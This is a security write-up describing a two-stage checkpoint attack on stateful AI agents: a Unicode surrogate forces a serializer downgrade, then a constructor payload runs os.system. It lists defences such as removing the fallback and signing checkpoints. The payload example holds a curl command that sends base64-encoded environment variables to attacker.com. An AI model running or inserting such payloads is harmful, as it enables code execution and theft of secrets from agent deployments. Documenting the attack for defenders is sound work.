## Summary

A **compound, two-stage attack** exploiting stateful agents: the first interaction injects a Unicode surrogate into persistent state to force a serialization format downgrade, and the second interaction injects a constructor payload that executes during the degraded deserialization — achieving RCE across separate agent sessions.

This vulnerability class is significant because **neither stage alone appears malicious**, and the two stages can be separated by hours or days, defeating single-interaction security analysis.

---

## Mechanism

### Stage 1 — Format Downgrade Trigger

The attacker sends input containing a Unicode surrogate character (e.g., `\ud800`) that is valid in Python strings but invalid in strict JSON. When the agent state is checkpointed:

1. The `JsonPlusSerializer` attempts strict JSON encoding
2. The surrogate causes `json.dumps()` to fail
3. The serializer silently falls back to pickle or msgpack with unsafe options
4. The checkpoint is stored in the degraded format

### Stage 2 — Constructor Payload Injection

In a subsequent interaction (minutes, hours, or days later), the attacker injects a constructor payload:

```json
{
  "lc": 2,
  "type": "constructor",
  "id": ["os", "system"],
  "args": ["curl attacker.com/exfil?data=$(env | base64)"]
}
```

Under the degraded serialization mode, this payload is not sanitized and is stored directly. On the next checkpoint load, the constructor is invoked, executing arbitrary code.

### Attack Flow

```
Session A (Stage 1 — Trigger):
  1. Attacker sends message with Unicode surrogate \ud800
  2. Agent processes normally, checkpoints state
  3. JsonPlusSerializer fails on \ud800, falls back to pickle/msgpack
  4. State stored in degraded format — checkpoint is "poisoned"

Session B (Stage 2 — Payload, possibly days later):
  1. Agent loads poisoned checkpoint (now in degraded format)
  2. Attacker sends message containing lc:2 constructor payload
  3. Agent checkpoints again — constructor payload passes through degraded serializer
  4. On next load, constructor executes: os.system() runs attacker command
  5. Full RCE achieved
```

---

## Blast Radius

- **Arbitrary code execution** in the agent runtime
- **Stealth**: Neither stage alone is detectable as an attack
- **Temporal separation**: Stages can be days apart, defeating session-based analysis
- **Persistence**: The format downgrade persists across sessions until explicitly reset
- **Full environment access** upon exploitation

## Defences

### 1. Eliminate Format Fallback
Never silently degrade serialization format. If strict JSON fails, **raise an error** rather than falling back to pickle or msgpack with unsafe options. The serializer must either succeed with a safe format or fail loudly.

### 2. Content Sanitization Before Persistence
Strip or reject Unicode surrogates and other format-confusing content before serialization. Validate that all state data is representable in the strictest available serialization format.

### 3. Checkpoint Integrity Verification
Cryptographically sign checkpoints at write time and verify signatures at load time. Detect any tampering or unexpected format changes between checkpoint write and read.

### 4. Temporal Anomaly Detection
Monitor for state content that changes serialization format between checkpoints. Alert on unexpected format transitions as indicators of stage-1 preparation. Flag sessions where serialization format degrades.

## Key Insight

> The Checkpoint Injection Chain demonstrates that **patching individual deserialization vulnerabilities is insufficient** when the serialization architecture allows silent format degradation. The chain exploits the *interaction* between two separate code paths — neither of which is vulnerable in isolation when properly configured, but which become exploitable when one can force the other's activation.

This pattern — **stage-1 configuration corruption enabling stage-2 payload delivery** — is likely to recur in any system with fallback-based serialization.
